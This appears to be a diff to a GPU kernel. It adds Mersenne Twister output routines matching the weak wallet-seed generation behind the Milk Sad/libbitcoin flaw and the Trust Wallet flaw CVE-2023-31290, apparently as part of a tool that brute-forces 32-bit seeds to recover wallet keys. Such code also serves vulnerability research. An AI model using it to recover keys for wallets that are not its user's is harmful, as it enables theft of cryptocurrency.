@@ -25,7 +25,7 @@ void mt19937_twist(__private uint* state) {
     }
 }
 
-// Extract first 4 words (128 bits)
+// Extract first 4 words (128 bits) - MSB extraction (for Milk Sad/libbitcoin)
 void mt19937_extract_128(uint seed, __private uint* output) {
     uint state[MT_N];
     
@@ -43,5 +43,28 @@ void mt19937_extract_128(uint seed, __private uint* output) {
         y ^= (y << 15) & 0xefc60000UL;
         y ^= (y >> 18);
         output[i] = y;
+    }
+}
+
+// Extract 16 words for LSB extraction (for Trust Wallet)
+// Trust Wallet takes only the LSB (least significant byte) from each word
+// See: CVE-2023-31290
+void mt19937_extract_128_lsb(uint seed, __private uint* output) {
+    uint state[MT_N];
+    
+    // 1. Initialize
+    mt19937_init(seed, state);
+    
+    // 2. Twist (generate first batch)
+    mt19937_twist(state);
+    
+    // 3. Temper and extract first 16 words (need 16 for 16 bytes of entropy)
+    for (int i = 0; i < 16; i++) {
+        uint y = state[i];
+        y ^= (y >> 11);
+        y ^= (y << 7) & 0x9d2c5680UL;
+        y ^= (y << 15) & 0xefc60000UL;
+        y ^= (y >> 18);
+        output[i] = y;  // Caller will extract LSB: output[i] & 0xFF
     }
 }
